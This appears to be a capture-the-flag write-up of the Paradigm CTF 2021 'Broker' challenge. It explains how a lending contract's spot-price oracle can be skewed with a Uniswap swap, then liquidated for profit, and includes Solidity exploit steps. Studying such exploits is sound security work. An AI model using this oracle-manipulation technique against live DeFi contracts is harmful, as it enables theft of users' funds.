@@ -1,0 +1,118 @@
+# Broker Challenge
+| Paradigm CTF 2021 Challenge - Oracle Manipulation Hack
+
+## Description & Setup
+| This broker has pretty good rates
+| ITEM             | Description                                                                                                                      |
+|------------------|----------------------------------------------------------------------------------------------------------------------------------|
+| Contract Address <- Our hack target | [Paradigm-CTF-2021-Broker](https://github.com/paradigmxyz/paradigm-ctf-2021/tree/master/broker/public)        |
+| Setup Contract   | [Paradigm-CTF-2021-Broker-Setup](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/broker/public/contracts/Setup.sol) |
+| Solution Contract| [Solution](https://github.com/paradigmxyz/paradigm-ctf-2021/blob/master/broker/private/Exploit.sol)                              |
+
+The majority of the setup is in the `Setup.sol` smart contract, it contains:
+- AMT Token Contract: been used as the treasury token for lending protocol
+- IUniswapV2Factory Interface: interface for Uniswap V2 create pair & Setup
+- Setup Contract: create and bootstrap the token/weth pool for borrowing against WETH
+
+Below is the setup logic: 
+- 1st create a pair for AMT & WETH
+- 2nd transfer 25 WETH & 500,000 AMT token to the pair
+- 3rd deposit 25 eth to borrow 250,000 AMT token from the lending protocol
+
+```solidity
+  // create and bootstrap the token/weth pool for borrowing against WETH
+    constructor() payable {
+        require(msg.value == 50 ether);
+        weth.deposit{value: msg.value}();
+
+        token = new Token();
+        pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
+        broker = new Broker(pair, ERC20Like(address(token)));
+        token.transfer(address(broker), 500_000 * DECIMALS);
+
+        // 1:25
+        weth.transfer(address(pair), 25 ether);
+        token.transfer(address(pair), 500_000 * DECIMALS);
+        pair.mint(address(this));
+
+        weth.approve(address(broker), type(uint256).max);
+        broker.deposit(25 ether);
+        broker.borrow(250_000 * DECIMALS);
+
+        totalBefore = weth.balanceOf(address(broker)) + token.balanceOf(address(broker)) / broker.rate();
+    }
+```
+
+Essentially, `broker.sol` is a simplified version of a ZERO-Interest Rate lending protocol. There are a lot of attack surfaces as a lending protoocl:
+- Collaterialized assets has reentrancy risks
+- Protocol might have reentrancy risks as well
+- Protocol implementation issue
+- Oracle attacks / manipulation & more
+
+## Solution
+
+The way to attack this lending protocol is relatively easy to figure out.
+The key of the manipulation is within these lines of the code:
+```solidity
+    function rate() public view returns (uint256) {
+        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
+        uint256 _rate = uint256(_reserve0 / _reserve1);
+        return _rate;
+    }
+```
+The oracle implementation is without the TWAP just brutally using the spot price. 
+Thus, we can use flashloan to manipulate the spot price and perform the attack, or just simply use the amount of tokens we had to perform the attack.
+In the liquidate function:
+```solidity
+  // safeDebt calculation
+    function safeDebt(address user) public view returns (uint256) {
+          return deposited[user] * rate() * 2 / 3;
+    }
+
+ // repay a user's loan and get back their collateral. no discounts.
+    function liquidate(address user, uint256 amount) public returns (uint256) {
+        require(safeDebt(user) <= debt[user], "err: overcollateralized");
+        debt[user] -= amount;
+        token.transferFrom(msg.sender, address(this), amount);
+        uint256 collateralValueRepaid = amount / rate();
+        weth.transfer(msg.sender, collateralValueRepaid);
+        return collateralValueRepaid;
+    }
+```
+If user's debt is bigger than their safeDebt which means user borrowed AMT token price goes rocket.
+Anyone can call liquidation method to liquidate user's fund.
+
+Implementation:
+Step 1: Trade 13 ETH for AMT token -> make the token price go roket
+```solidity
+ // trade 13 eth for some tokens
+    address[] memory path = new address[](2);
+    path[0] = address(weth);
+    path[1] = address(token);
+    uint256[] memory tokensReceived = router.swapExactTokensForTokens(
+        ethToSend,
+        1,
+        path,
+        address(this),
+        type(uint256).max
+    );
+```
+
+Step 2: we can liquidate the guy with the tokens received
+```solidity
+    uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);
+    require(weth.balanceOf(address(this)) > balanceBefore);
+```
+Although the given solution manipulation is not profitable, but we can for sure manipulate the oracle.
+I found another method online, which has similar idea:
+
+Step 1: skew the uniswap ratio by buying lots of tokens
+```solidity
+    weth.transfer(address(pair), weth.balanceOf(address(this)));
+```
+Step 2: since win condition is when there are less than 5 eth in the pool, thus we only need to liquidate 21 eth.
+```solidity
+    uint256 liqAmount = 21 ether * rate;
+    broker.liquidate(address(setup), liqAmount);
+```
+
